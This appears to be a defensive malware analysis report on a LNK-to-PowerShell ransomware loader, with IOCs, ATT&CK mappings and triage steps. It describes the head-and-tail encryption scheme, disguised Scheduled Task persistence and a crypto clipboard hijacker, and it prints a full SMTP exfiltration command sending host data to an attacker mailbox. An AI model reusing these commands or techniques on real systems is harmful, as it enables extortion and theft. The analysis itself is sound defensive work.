## Executive summary

- Type: Ransomware loader via LNK → PowerShell
- Impact: Partial file encryption (head + tail), ransom note drop, persistence via Scheduled Tasks, clipboard hijacking for crypto addresses, basic host info exfiltration via SMTP
- User decoy: Opens a benign-looking minutes text file to distract the victim

## LNK target and initial behavior
- Target: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w h -ep b -c "..."`
  - `-w h` hidden window, `-ep b` ExecutionPolicy Bypass, inline PowerShell payload
- Creates and opens decoy file: `%TEMP%\Project_Workshop_7th_Minutes.txt`

## PowerShell payload overview
The inline PowerShell defines multiple functions whose bodies are stored as Base64 blobs and executed with IEX. I extracted and decoded all Base64 blobs; artifacts are saved alongside this report.

Decoded artifacts
- Full captured command: `Files/original_target_command.txt`
- Base64 manifest: `Files/decoded_manifest.json`
- Decoded blocks:
  - a_0 → `Files/decoded_a_0.txt`: main ransomware encryptor + ransom note dropper
  - j_1 → `Files/decoded_j_1.txt`: persistence tasks for function `c` (encryptor)
  - p_2 → `Files/decoded_p_2.txt`: persistence tasks for function `b` (loader calling encryptor)
  - a_3 → `Files/decoded_a_3.txt`: clipboard hijacker (BTC/ETH/SOL)
  - j_4 → `Files/decoded_j_4.txt`: persistence for function `p` (re-seeding tasks)
  - a_5 → `Files/decoded_a_5.txt`: clipboard hijacker (duplicate of a_3)
  - j_6 → `Files/decoded_j_6.txt`: persistence for function `p` (duplicate of j_4)
  - x_7 → `Files/decoded_x_7.txt`: persistence that schedules `q` (clipboard hijack) and `r` (task re-seeding)

## Ransomware encryption details (from decoded_a_0)
- Targets
  - User profile folders: Documents, Pictures, Videos, Music, Desktop, Downloads, Favorites, OneDrive
  - Fixed/removable drives: D:\, E:\, F:\, G:\, H:\
- Exclusions by extension (will NOT encrypt): `.exe,.lnk,.dll,.bin,.bat,.cmd,.sys,.inf,.vxd,.ini,.cfg,.reg,.hiv,.tmp,.html`
- Method
  - AES-CBC (random 16‑byte key per run; random IV per file), PKCS7 padding
  - RSA (public key embedded; exponent 0x10001) used to encrypt the AES key; appended per file
  - For each file: encrypt first 4KB; if file > 4KB, also encrypt last 4KB; else encrypt whole file
  - Appends trailer: IV (16 bytes) + RSA-encrypted AES key (likely 256 bytes) ≈ 272 bytes total
  - Renames files to add `.tmp` (e.g., `report.docx.tmp`)
  - Multi-threaded via RunspacePool; clears Recycle Bin afterward
- Ransom note
  - Dropped as `DECRYPT_INSTRUCTION.html` in each processed directory
  - Timers: “Payment due” 48h; “Files lost” 120h (computed from current UTC)
  - Payment: Monero (XMR) $500 to wallet below; provides “Generate Machine ID” UI
  - Contacts: email and TOX (below)

## Persistence (Scheduled Tasks)
Creates multiple Scheduled Tasks to ensure repeated execution in hidden PowerShell:
- WindowsLicenseManager (At logon) → runs encryptor `c`
- MicrosoftEdgeUpdate (Daily 11:00) → runs encryptor `c`
- WindowsSecurityUpdateService (Daily 17:00) → runs encryptor `c`
- WindowsWirelessService (At logon) → runs loader/clipboard hijacker (`p` or `q`)
- WindowsSecurityService (At logon) → runs `r` (task re-seeding)
Command template executed by tasks:
- `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -c "<inlined function body>"`

## Clipboard hijacking (from decoded_a_3 / a_5)
Continuously monitors clipboard and replaces cryptocurrency addresses with attacker-controlled ones:
- BTC (bech32): pattern `^bc1q[ac-hj-np-z02-9]{38}$` → replace with `bc1q3d3cmkmhgrxczxhh9n489mxtgk35ld8mtllcd7`
- ETH (hex): pattern `^0x[a-fA-F0-9]{40}$` → replace with `0xa617428aA72Cd7a816aB79e488A1eEC15E7cB23B`
- SOL (base58 44 chars): pattern `^[1-9A-HJ-NP-Za-km-z]{44}$` → replace with `p8paSRFj1CbUM3pik4j53y5aXTJqBd9UcjEmYCz5M1g`

## Host info exfiltration
Sends basic host profile via SMTP:
- Cmd: `Send-MailMessage -SmtpServer in.mail.tm -Port 25 -From 'test@test.com' -To '244zita@mechanicspedia.com' -Subject 'MachineInfo' -Body "<OS | PSVersion | CPU | User>"`

## Indicators of Compromise (IOCs)
- LNK behavior: PowerShell with `-w h -ep b -c`, decoy file `%TEMP%\Project_Workshop_7th_Minutes.txt`
- Dropped ransom note: `DECRYPT_INSTRUCTION.html` in many directories
- File rename: adds `.tmp`; file trailer ≈ 272 bytes (16 IV + 256 RSA)
- File hashes (SHA-256):
  - LNK: B0371C1026FB1E75F4BBB7FA4E0A344086AEF7787C78117576A50C00C67B9264
  - target.txt: 9AD96CD95FBF4365602470839A0AE2FC685019A5F338DDE772F7D475338A6B61
- Monero wallet (ransom):
  - `8BEMpCuSL5aBF5rG1a9UNFgBcPU16eNUXbXDBzQJqD3E4jdJaUhAw3LCVH3F4gPUysioYrjsPMa3447oLoSuAhUrH7EQtCC`
- Clipboard hijack addresses:
  - BTC: `bc1q3d3cmkmhgrxczxhh9n489mxtgk35ld8mtllcd7`
  - ETH: `0xa617428aA72Cd7a816aB79e488A1eEC15E7cB23B`
  - SOL: `p8paSRFj1CbUM3pik4j53y5aXTJqBd9UcjEmYCz5M1g`
- Ransom contacts:
  - Email: `kit8280@punkproof.com`
  - TOX: `D6DABDD9600C9C5481ED4127071509D287DD539FB36F0BC82D4FA0F0800AF970923B5500064D`
- Exfil target:
  - SMTP server: `in.mail.tm:25`
  - Recipient: `244zita@mechanicspedia.com`
- Scheduled Task names:
  - WindowsLicenseManager, MicrosoftEdgeUpdate, WindowsSecurityUpdateService, WindowsWirelessService, WindowsSecurityService

## Likely MITRE ATT&CK
- T1059.001 PowerShell
- T1486 Data Encrypted for Impact
- T1053.005 Scheduled Task
- T1115 Clipboard Data (hijacking)
- T1041 Exfiltration Over Unencrypted/Non-C2 Channel (SMTP)

## Assessment and conclusion
- This LNK is a ransomware dropper/launcher. It encrypts file head/tail, appends IV+RSA-encrypted AES key, renames to `.tmp`, and drops a ransom note requesting XMR.
- It persists via multiple Scheduled Tasks and includes a crypto clipboard hijacker to steal unrelated payments.
- Without the RSA private key matching the embedded modulus, decryption is not feasible; restoration requires clean backups or volume shadow copies if intact (none are explicitly deleted here).

## Analyst notes and triage guidance
- Contain:
  - Kill hidden PowerShell sessions; disable PowerShell for the user temporarily
  - Delete the Scheduled Tasks listed above
  - Block egress to `in.mail.tm` and mail to `mechanicspedia.com`
- Hunt:
  - Search for `.tmp`-suffixed user files with 272-byte trailers
  - Locate `DECRYPT_INSTRUCTION.html` (hash across environment) and remove
  - Review Event Logs: Microsoft-Windows-TaskScheduler/Operational for the task names
- Recover:
  - Restore affected files from backups; confirm restored files lack the 272-byte trailer
- Prevent:
  - Constrain PowerShell (Constrained Language Mode / Script Block Logging), application control for LNK → PowerShell chain

## Evidence references
- `Files/original_target_command.txt`
- `Files/decoded_a_0.txt` (encryptor + ransom note)
- `Files/decoded_j_1.txt`, `decoded_p_2.txt`, `decoded_j_4.txt`, `decoded_j_6.txt`, `decoded_x_7.txt` (persistence)
- `Files/decoded_a_3.txt`, `decoded_a_5.txt` (clipboard hijack)
